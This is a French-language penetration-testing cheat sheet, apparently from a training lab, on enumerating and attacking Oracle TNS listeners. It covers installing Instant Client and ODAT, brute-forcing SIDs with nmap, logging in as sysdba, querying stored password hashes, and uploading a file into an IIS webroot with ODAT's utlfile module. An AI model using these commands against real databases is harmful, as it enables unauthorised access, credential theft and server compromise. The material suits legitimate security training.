Le serveur `Oracle Transparent Network Substrate`( `TNS`) est un protocole de communication qui facilite la communication entre les bases de données et les applications Oracle sur les réseaux.

Avant de pouvoir énumérer l'écouteur TNS et interagir avec lui, nous devons télécharger quelques paquets et outils
```bash
wget https://download.oracle.com/otn_software/linux/instantclient/214000/instantclient-basic-linux.x64-21.4.0.0.0dbru.zip

wget https://download.oracle.com/otn_software/linux/instantclient/214000/instantclient-sqlplus-linux.x64-21.4.0.0.0dbru.zip

sudo mkdir -p /opt/oracle
sudo unzip -d /opt/oracle instantclient-basic-linux.x64-21.4.0.0.0dbru.zip
sudo unzip -d /opt/oracle instantclient-sqlplus-linux.x64-21.4.0.0.0dbru.zip
export LD_LIBRARY_PATH=/opt/oracle/instantclient_21_4:$LD_LIBRARY_PATH
export PATH=$LD_LIBRARY_PATH:$PATH
source ~/.bashrc
git clone https://github.com/quentinhardy/odat.git
cd odat/
pip install python-libnmap
git submodule init
git submodule update
pip3 install cx_Oracle
sudo apt-get install python3-scapy -y
sudo pip3 install colorlog termcolor passlib python-libnmap
sudo apt-get install build-essential libgmp-dev -y
pip3 install pycryptodome
./odat.py -h # si l'instalation a reuissi 

```


Oracle Database Attacking Tool ( `ODAT`) est un outil de test d'intrusion open source écrit en Python et conçu pour recenser et exploiter les vulnérabilités des bases de données Oracle. Il permet d'identifier et d'exploiter diverses failles de sécurité dans les bases de données Oracle, notamment l'injection SQL, l'exécution de code à distance et l'élévation de privilèges.


#### Brute force  SID 

```bash
sudo nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-brute
```

```bash
./odat.py all -s 10.129.204.235
```

SQLplus pour se connecter a la bd 

```bash
sqlplus username/password@10.129.204.235/XE
```

Si vous rencontrez l'erreur suivante `sqlplus: error while loading shared libraries: libsqlplus.so: cannot open shared object file: No such file or directory`, veuillez exécuter ce qui suit, extrait d' [ici](https://stackoverflow.com/questions/27717312/sqlplus-error-while-loading-shared-libraries-libsqlplus-so-cannot-open-shared) .

```bash
sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf";sudo ldconfig
```

```bash
sqlplus username/password@10.129.204.235/XE as sysdba

SQL> select * from user_role_privs;
SQL> select name, password from sys.user
```

Telechargement de fichier 

```bash
./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt
```

https://docs.oracle.com/cd/E11882_01/server.112/e41085/sqlqraa001.htm#SQLQR985